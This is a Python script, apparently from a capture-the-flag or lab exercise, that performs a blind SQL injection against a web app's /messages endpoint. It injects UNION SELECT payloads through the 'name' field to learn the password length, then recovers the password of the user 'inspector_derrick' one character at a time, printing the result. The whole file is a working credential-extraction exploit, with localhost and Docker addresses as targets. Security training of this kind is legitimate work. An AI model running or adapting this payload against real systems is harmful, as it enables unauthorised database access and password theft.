
import sys
import requests

def isValidCondition(post_result):

    return ("The name exists ! " in post_result)

def findPassLen(post_address):
    pass_length = 1
    while(True):
        injection = "dumb' UNION SELECT name, password FROM users WHERE LENGTH(password) = {} AND name = 'inspector_derrick".format(pass_length)
        post_result= requests.post("http://"+post_address+"/messages", data = {"name":injection})
        if isValidCondition(post_result.text):
            return pass_length
        pass_length += 1


def find_pass(post_address, charset, pass_length):
    password = ''
    for i in range(1, pass_length+1):
        for char_ in charset:
            injection = "dumb' UNION SELECT name, password FROM users WHERE SUBSTRING(password, {}, 1) = '{}' AND name = 'inspector_derrick".format(i,char_)
            post_result = requests.post("http://"+post_address+"/messages", data = {"name":injection})
            if isValidCondition(post_result.text):
                password += char_
                break
    return password

chars = "0123456789abcdefghijklmnopqrstuvwxyz"


if __name__ == '__main__':
    ip_addr = '127.0.0.1'
    if(len(sys.argv)>1):
        ip_addr = '172.17.0.2'
    pass_length = findPassLen(ip_addr)
    password = find_pass(ip_addr, chars, pass_length)

    print(password)